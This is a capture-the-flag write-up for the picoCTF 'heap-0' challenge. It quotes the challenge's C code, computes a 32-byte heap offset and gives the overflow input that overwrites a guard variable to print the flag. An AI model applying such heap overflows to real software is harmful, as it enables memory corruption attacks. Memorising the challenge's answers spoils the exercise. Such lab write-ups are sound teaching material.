# heap-0
picoCTF Link: [https://play.picoctf.org/practice/challenge/438](https://play.picoctf.org/practice/challenge/438)

## About

```
Description:
Are overflows just a stack concern?

Hints:
1. What part of the heap do you have control over and how far is it from the safe_var?
```

## Solution

Looking at the files, we find that we need to modify `save_var` to get the flag.

```c
void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```

Luckily, the author gives us the exact location of both `input_data` and `safe_var`, which make it very easy to know how much data we need to write into `input_data` before reaching `save_var`. The function that writes is as follow:

```c
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```

```
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5618445cd6b0  ->   pico
+-------------+----------------+
[*]   0x5618445cd6d0  ->   bico
+-------------+----------------+
```

So, all that's left is to substract both addresses `0x5618445cd6d0 - 0x5618445cd6b0 = 0x20`, meanging that we have to write 32 bytes before reaching `save_var`.

## Answer

```
Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA_
Enter your choice: 4
```